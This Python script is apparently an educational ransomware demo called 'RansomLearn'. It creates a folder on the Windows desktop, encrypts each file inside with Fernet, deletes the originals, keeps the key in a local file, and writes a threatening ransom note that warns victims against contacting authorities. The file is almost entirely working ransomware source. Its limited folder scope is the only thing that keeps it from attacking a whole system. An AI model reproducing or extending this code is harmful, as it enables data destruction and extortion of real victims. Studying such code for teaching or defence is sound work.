import os
import glob
from cryptography.fernet import Fernet

def get_desktop_path():
    user_profile = os.environ["USERPROFILE"]
    onedrive_desktop = os.path.join(user_profile, "OneDrive", "Desktop")
    default_desktop = os.path.join(user_profile, "Desktop")
    return onedrive_desktop if os.path.exists(onedrive_desktop) else default_desktop

desktop = get_desktop_path()
ransom_folder = os.path.join(desktop, "RansomLearn")
files_folder = os.path.join(ransom_folder, "Files")
key_folder = os.path.join(ransom_folder, "Key")
ransom_note_path = os.path.join(ransom_folder, "RansomNote.txt")
key_file = os.path.join(key_folder, "encryption.key")
passkey_file = os.path.join(ransom_folder, "passkey.txt")

os.makedirs(files_folder, exist_ok=True)
os.makedirs(key_folder, exist_ok=True)

def generate_key():
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)
    return key

def load_key():
    if os.path.exists(key_file):
        with open(key_file, "rb") as f:
            return f.read()
    return generate_key()

key = load_key()
cipher = Fernet(key)

def encrypt_files():
    if not os.path.exists(files_folder):
        exit(1)

    files = glob.glob(os.path.join(files_folder, "*"))

    for file_path in files:
        if file_path.endswith(".locked") or file_path == key_file:
            continue  

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = cipher.encrypt(data)

            with open(file_path + ".locked", "wb") as f:
                f.write(encrypted_data)

            os.remove(file_path)

        except:
            pass

def create_ransom_note():
    ransom_note_content = """
██     ██  █████  ██████  ███     ██ ██ ███    ██  ██████  
██     ██ ██   ██ ██   ██ ████    ██ ██ ████   ██ ██       
██  █  ██ ███████ █████   ██ ██  ██ ██ ██ ██  ██ ██   ███ 
██ ███ ██ ██   ██ ██   ██ ██ ██ ██ ██ ██  ██ ██ ██    ██ 
 ███ ███  ██   ██ ██   ██ ██   ████ ██ ██   ████  ██████  

!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

All your important files in 'RansomLearn' have been locked using **military-grade encryption**.

>>>> **How to recover your files?**
Enter the **correct decryption key** in the RansomLearn interface.

>>>> **What happens if you fail?**
❌ Incorrect attempts may result in **permanent data loss**.  
❌ Trying to remove this ransomware may corrupt your files.  

⏳ **Time is running out!** ⏳

!! DO NOT TRY AND ALERT ANY AUTHORITIES..FAILURE TO SUBMIT THE RANSOM WILL LEAD TO GRAVE CONSEQUENCES !!
"""

    if not os.path.exists(ransom_note_path):
        with open(ransom_note_path, "w", encoding="utf-8") as f:
            f.write(ransom_note_content)

def create_passkey_file():
    with open(passkey_file, "w") as f:
        f.write("Ransom@Learn")

if not os.path.exists(key_file):  
    with open(key_file, "wb") as f:
        f.write(key)

encrypt_files()
create_ransom_note()
create_passkey_file()
